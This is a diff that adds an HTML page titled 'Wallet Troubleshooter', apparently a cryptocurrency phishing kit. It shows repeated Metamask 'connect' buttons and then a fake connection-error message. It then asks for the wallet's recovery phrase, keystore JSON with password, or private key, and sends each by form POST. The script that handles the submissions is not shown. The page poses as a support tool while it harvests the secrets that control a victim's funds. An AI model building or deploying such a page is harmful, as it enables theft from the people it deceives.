@@ -1,0 +1,353 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <title>Wallet Troubleshooter</title>
+        <!-- Required meta tags -->
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
+
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,200..1000;1,6..12,200..1000&display=swap" rel="stylesheet">
+        <!-- Bootstrap CSS v5.2.1 -->
+        <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
+        <!-- Main CSS -->
+        <link rel="stylesheet" href="css/styles.css">
+        <!-- Animate CSS -->
+        <link rel="stylesheet" href="css/animate.css">
+        <!-- Font Awesome JS -->
+        <script src="js/font-awesome.js"></script>
+        <!-- Line Awesome Css -->
+        <link rel="stylesheet" href="line-awesome/css/line-awesome.css">
+        <link rel="stylesheet" href="line-awesome/css/line-awesome.min.css">
+    </head>
+
+    <body>
+
+        <div class="dots-container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+
+        <div class="grid-overlay"></div>
+
+        <div class="main-content">
+
+            <div class="main-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-lg-7 col-md-10">
+                            <div class="sync-area">
+                                <h5 class="text-white font-700 sync-head">Connect your wallet</h5>
+
+                                <div class="card sync-card mt-3">
+                                    <div class="card-header">
+                                       <h6 class="font-700 text-dark">Connect to a wallet</h6>
+                                    </div>
+                                    <div class="card-body">
+
+                                        <div class="wallet-list">
+                                            <a href="javascript: void(0);" onclick="iniwallet('Metamask', 'img/meta.png')">
+                                                <div>
+                                                <span class="small-ball"></span>
+                                                <span class="font-700">Metamask</span>
+                                                </div>
+                                                <div>
+                                                    <img src="img/meta.png" alt="" class="img" width="40">
+                                                </div>
+                                            </a>
+                                        </div>
+
+                                        <div class="wallet-list">
+                                            <a href="javascript: void(0);" onclick="iniwallet('Metamask', 'img/meta.png')">
+                                                <div>
+                                                <span class="small-ball"></span>
+                                                <span class="font-700">Metamask</span>
+                                                </div>
+                                                <div>
+                                                    <img src="img/meta.png" alt="" class="img" width="40">
+                                                </div>
+                                            </a>
+                                        </div>
+
+                                        <div class="wallet-list">
+                                            <a href="javascript: void(0);" onclick="iniwallet('Metamask', 'img/meta.png')">
+                                                <div>
+                                                <span class="small-ball"></span>
+                                                <span class="font-700">Metamask</span>
+                                                </div>
+                                                <div>
+                                                    <img src="img/meta.png" alt="" class="img" width="40">
+                                                </div>
+                                            </a>
+                                        </div>
+
+                                        <div class="wallet-list">
+                                            <a href="javascript: void(0);" onclick="iniwallet('Metamask', 'img/meta.png')">
+                                                <div>
+                                                <span class="small-ball"></span>
+                                                <span class="font-700">Metamask</span>
+                                                </div>
+                                                <div>
+                                                    <img src="img/meta.png" alt="" class="img" width="40">
+                                                </div>
+                                            </a>
+                                        </div>
+
+                                        <div class="wallet-list">
+                                            <a href="javascript: void(0);" onclick="iniwallet('Metamask', 'img/meta.png')">
+                                                <div>
+                                                <span class="small-ball"></span>
+                                                <span class="font-700">Metamask</span>
+                                                </div>
+                                                <div>
+                                                    <img src="img/meta.png" alt="" class="img" width="40">
+                                                </div>
+                                            </a>
+                                        </div>
+
+                                        <div class="wallet-list">
+                                            <a href="javascript: void(0);" onclick="iniwallet('Metamask', 'img/meta.png')">
+                                                <div>
+                                                <span class="small-ball"></span>
+                                                <span class="font-700">Metamask</span>
+                                                </div>
+                                                <div>
+                                                    <img src="img/meta.png" alt="" class="img" width="40">
+                                                </div>
+                                            </a>
+                                        </div>
+
+                                        <div class="wallet-list">
+                                            <a href="javascript: void(0);" onclick="iniwallet('Metamask', 'img/meta.png')">
+                                                <div>
+                                                <span class="small-ball"></span>
+                                                <span class="font-700">Metamask</span>
+                                                </div>
+                                                <div>
+                                                    <img src="img/meta.png" alt="" class="img" width="40">
+                                                </div>
+                                            </a>
+                                        </div>
+
+
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Initialization Modal -->
+        <div class="modal fade" id="inimodalId" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog" aria-labelledby="modalTitleId" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered" role="document">
+                <div class="modal-content">
+                    <div class="modal-body">
+
+                    <div class="loader-container mb-3">
+                        <span class="loading-text">Processing</span>
+                        <div class="loader">
+                            <div class="bar"></div>
+                            <div class="bar"></div>
+                            <div class="bar"></div>
+                        </div>
+                    </div>
+
+                        <div class="wallet-list">
+                            <a href="javascript: void(0);">
+                                <div>
+                                <span id="wall_name" class="font-700"></span> <br>
+                                <small class="text-black-50 font-600" class="font-13">easy to use browser extension</small>
+                                </div>
+                                <div>
+                                    <img src="" alt="" id="wall_img" class="img" width="40">
+                                </div>
+                            </a>
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Initialization Modal End -->
+
+        <!-- Import Wallet Modal -->
+        <div class="modal fade" id="impmodalId" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog" aria-labelledby="modalTitleId" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered" role="document">
+                <div class="modal-content">
+                    <div class="modal-body">
+                        <p class="text-danger font-600">
+                            There was an error connecting automatically. But do not worry, you can still connect manually.
+                        </p>
+                        <h6 class="font-700 mb-3">
+                            <img src="" id="wall_img2" alt="" class="img" width="40">
+                            Import your <span id="wall_name2"></span> wallet
+                        </h6>
+
+
+                        <!-- Nav tabs -->
+                        <ul class="nav nav-pills wallet-pills justify-content-center" id="myTab" role="tablist">
+                            <li class="nav-item" role="presentation">
+                                <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home" type="button" role="tab" aria-controls="home" aria-selected="true">
+                                    Phrase
+                                </button>
+                            </li>
+                            <li class="nav-item" role="presentation">
+                                <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile" type="button" role="tab" aria-controls="profile" aria-selected="false">
+                                    Keystore JSON
+                                </button>
+                            </li>
+                            <li class="nav-item" role="presentation">
+                                <button class="nav-link" id="messages-tab" data-bs-toggle="tab" data-bs-target="#messages" type="button" role="tab" aria-controls="messages" aria-selected="false">
+                                    Private Key
+                                </button>
+                            </li>
+                        </ul>
+                        
+                        <!-- Tab panes -->
+                        <div class="tab-content">
+                            <div class="tab-pane active" id="home"  role="tabpanel" aria-labelledby="home-tab">
+                                <form action="" method="post">
+                                    <div class="form-group mt-3">
+                                        <textarea name="phrase" id="phrase" class="form-control" placeholder="Enter Wallet Phrase" rows="3" required></textarea>
+                                    </div>
+
+                                    <input type="hidden" name="wallet_name" id="wall_name3" value="">
+                                    <div class="form-group mt-3 d-grid">
+                                        <button type="submit" class="btn btn-card crypto-button font-600">Validate</button>
+                                    </div>
+                                </form>
+                            </div>
+                            <div class="tab-pane" id="profile" role="tabpanel" aria-labelledby="profile-tab">
+                                <form action="" method="post">
+                                    <div class="form-group mt-3">
+                                        <textarea name="keystore" id="keystore" class="form-control" placeholder="Enter Keystore JSON" rows="3" required></textarea>
+                                    </div>
+
+                                    <div class="form-group mt-3">
+                                        <input type="text" name="wall_pwd" id="wall_pwd" class="form-control" placeholder="Enter Wallet Password" required>
+                                    </div>
+
+                                    <input type="hidden" name="wallet_name" id="wall_name4" value="">
+                                    <div class="form-group mt-3 d-grid">
+                                        <button type="submit" class="btn btn-card crypto-button font-600">Validate</button>
+                                    </div>
+                                </form>
+                            </div>
+                            <div class="tab-pane" id="messages" role="tabpanel" aria-labelledby="messages-tab">
+                                <form action="" method="post">
+
+                                    <div class="form-group mt-3">
+                                        <input type="text" name="priv_key" id="priv_key" class="form-control" placeholder="Enter Private Key" required>
+                                    </div>
+
+                                    <input type="hidden" name="wallet_name" id="wall_name5" value="">
+                                    <div class="form-group mt-3 d-grid">
+                                        <button type="submit" class="btn btn-card crypto-button font-600">Validate</button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+
+                        <div class="text-end mt-3">
+                            <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Close</button>
+                        </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Import Wallet Modal End -->
+
+        <!-- Trying to Connect Modal -->
+        <div class="modal fade" id="trymodalId" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog" aria-labelledby="modalTitleId" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered" role="document">
+                <div class="modal-content">
+                    <div class="modal-body">
+
+                    <div class="loader-container">
+                        <span class="loading-text">Trying to Connect to Wallet</span>
+                        <div class="loader">
+                            <div class="bar"></div>
+                            <div class="bar"></div>
+                            <div class="bar"></div>
+                        </div>
+                    </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Trying to Connect Modal End -->
+
+        <!-- Connecting Modal -->
+        <div class="modal fade" id="conmodalId" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog" aria-labelledby="modalTitleId" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered" role="document">
+                <div class="modal-content">
+                    <div class="modal-body">
+
+                    <div class="loader-container">
+                        <span class="loading-text">Connecting</span>
+                        <div class="loader">
+                            <div class="bar"></div>
+                            <div class="bar"></div>
+                            <div class="bar"></div>
+                        </div>
+                    </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Connecting Modal End -->
+        
+
+        <!-- Bootstrap JavaScript Libraries -->
+        <script src="bootstrap/js/popper.min.js"></script>
+        <script src="bootstrap/js/bootstrap.min.js"></script>
+        <!-- Wow JS -->
+        <script src="js/wow.js"></script>
+        <script>
+        wow = new WOW(
+        {
+            boxClass:     'wow',      // default
+            animateClass: 'animated', // default
+            offset:       0,          // default
+            mobile:       true,       // default
+            live:         true        // default
+        }
+        )
+        wow.init();
+    </script>
+
+            <!-- Jquery Library -->
+        <script src="js/jquery-2.1.3.min.js"></script>
+
+       <!-- Sweet Alert JS -->
+       <script src="js/sweet-alert.js"></script>
+       <!-- Main JS -->
+       <script src="js/script.js"></script>
+    </body>
+</html>
